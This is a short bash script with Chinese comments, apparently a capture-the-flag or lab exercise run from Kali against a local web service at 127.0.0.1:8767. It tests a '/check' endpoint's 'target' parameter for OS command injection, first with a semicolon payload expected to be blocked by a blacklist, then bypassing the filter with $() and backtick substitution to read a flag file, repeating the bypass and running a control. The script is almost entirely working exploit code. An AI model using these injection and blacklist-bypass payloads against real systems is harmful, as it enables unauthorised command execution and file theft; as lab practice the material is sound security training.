#!/bin/bash
# 第三关：Kali 内部实测脚本，全部打 127.0.0.1
BASE="http://127.0.0.1:8767"

echo "=== 0 摸情况：首页有什么功能 ==="
curl -s -m 5 "$BASE/" | head -c 300
echo
echo

echo "=== 1 正常请求（输入 127.0.0.1）==="
curl -s -m 5 -G --data-urlencode 'target=127.0.0.1' "$BASE/check"
echo
echo

echo "=== 2 直白注入：分号拼命令（预期被黑名单拦）==="
curl -s -m 5 -G --data-urlencode 'target=127.0.0.1; cat /tmp/kali_flag.txt' "$BASE/check"
echo
echo

echo "=== 3 绕过：用 \$() 包住命令（黑名单没挡这个）==="
curl -s -m 5 -G --data-urlencode 'target=127.0.0.1$(cat /tmp/kali_flag.txt)' "$BASE/check"
echo
echo

echo "=== 4 绕过：用反引号包住命令 ==="
curl -s -m 5 -G --data-urlencode 'target=127.0.0.1`cat /tmp/kali_flag.txt`' "$BASE/check"
echo
echo

echo "=== 5 复现3次，确认不是碰巧 ==="
for i in 1 2 3; do
  curl -s -m 5 -G --data-urlencode 'target=127.0.0.1$(cat /tmp/kali_flag.txt)' "$BASE/check"
  echo
done
echo

echo "=== 6 对照：读一个不存在的文件 ==="
curl -s -m 5 -G --data-urlencode 'target=127.0.0.1$(cat /tmp/no_such_file_xyz)' "$BASE/check"
echo
